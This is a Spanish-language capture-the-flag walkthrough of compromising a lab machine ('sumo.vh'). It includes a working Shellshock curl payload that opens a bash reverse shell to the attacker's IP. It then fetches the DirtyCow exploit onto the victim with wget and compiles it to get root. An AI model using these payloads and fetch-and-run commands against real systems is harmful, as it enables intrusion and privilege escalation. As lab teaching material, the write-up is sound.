- Iniciamos haciendo ping a la IP para asegurarnos que la maquina esté activa, tuve problemas con herramientas como arp-scan o  netdiscover, así que me cree un [script](https://github.com/JoseVazquez101/My-scr1pt5/blob/main/hostscan.sh) para escanear mi red local:
- También he decidido añadir una resolución DNS local con el siguiente comando:
  ~~~bash
  echo '192.168.17.135  sumo.vh' >> /etc/hosts
  ~~~
- Si todo funciona, llegaría la hora de realizar el escaneo con nmap, los parametros que suelo utilizar son los siguientes:

  ~~~bash 
  sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV sumo.vh
  ~~~

- Y vemos que hay un servicio http ejecutándose en el equipo objetivo:

![[Pasted image 20231111201246.png]]
![[Pasted image 20231111201504.png]]
- Con esto en mente, podemos realizar una enumeración de directorios de la siguiente manera:
~~~ bash
gobuster dir -u http://sumo.vh -w /usr/share/wordlists/dirb/big.txt -t 20 --add-slash --no-error
~~~

![[Pasted image 20231111201620.png]]
- A simple vista podríamos pensar que no existe nada fuera de lugar, pero para los ojos mas experimentados, la ruta **/cgi-bin** resulta llamativa, pues podríamos intentar enumerarla a ver si podemos explotar un posible [ShellShock](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/cgi)
- Enumeramos http://sumo.vh/cgi-bin/ y vemos algo interesante:
  ![[Pasted image 20231111202059.png]]
  - Intentaremos ganar acceso a través de un header malicioso con Curl, que incluirá un reverse shell, esto de la siguiente manera:
  
~~~ bash 
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.17.128/4444 0>&1' http://sumo.vh/cgi-bin/test.sh
~~~

![[Pasted image 20231111202501.png]]
- Y estamos dentro :D

***
<h3>PrivEsc</h3>
- Al entrar, podemos comprobar que somos www-data, por lo que tendremos que enumerar de manera bastante detallada los vectores para escalar privilegios:
  ![[Pasted image 20231111202805.png]]
  - Hacemos un tratamiento de TTY de la siguiente forma para mas comodidad (opcional):
~~~ bash
script /dev/null -c bash
^Z
#Dejamos nuestra sesión en segundo plano
stty raw -echo; fg
#Nuestro tecleo será invisible, reiniciamos la xterm de igual manera
reset xterm
#Nos aparecerá un mensaje
export TERM=xterm
export SHELL=bash
~~~

- Después de enumerar por distintos vectores de ataque, me decidí centrar en algo que me llamó la atención, la versión de kernel parecía antigua, al ser una 3.2.0-23-generic:
  ![[Pasted image 20231111210152.png]]
  - Si buscamos en Searchsploit por kernel 3.2 podremos encontrar algunos exploits, pero los mas interesantes son los de DirtyCow:
    ![[Pasted image 20231111210738.png]]
- Vemos que están basados en Race Condition, elegiremos el que está enfocado en PrivEsc (linux/local/40839.c)
- Nos pasamos el script de la siguiente manera al directorio actual:
  ~~~ bash
  searchsploit -m 40839.c
  ~~~

- La maquina victima tiene gcc, así que podemos compilarlo desde ahí, por lo que montamos un servidor http desde nuestro lado y lo descargamos con wget:
	- En mi maquina:
	  ~~~ bash
	  python3 -m http.server 1234
	  ~~~
	  - En la maquina victima:
	  ~~~ bash
	  cd /tmp
	  wget http://192.168.17.128:1234/40839.c
	  gcc -pthread 40839.c -o dirty.o -lcrypt
	  ~~~
- Tuve algunos problemas con el binario de gcc en la maquina, así que tuve que mover mi binario de gcc con el servidor de python y cambiar la PATH para que buscase en mi directorio, por si a alguien mas le sucede, lo cambié así:
  - En mi maquina:
~~~ bash
cd /usr/bin
python3 -m http.server 1234
~~~
 - En la maquina victima:
~~~ bash
wget http://192.168.17.128:1234/gcc
export PATH=/tmp:$PATH 
~~~

- Ahora ejecutamos el binario compilado y asignaremos una contraseña, en pocas palabras el código erradica al ussuario root y lo sustituye por otro con una uid 0, modificando con este permiso el archivo de /etc/passwd y asignando una contraseña conocida:
  - Y con esto seremos root :D
  ![[Pasted image 20231111220347.png]]
  ![[Pasted image 20231111234554.png]]
  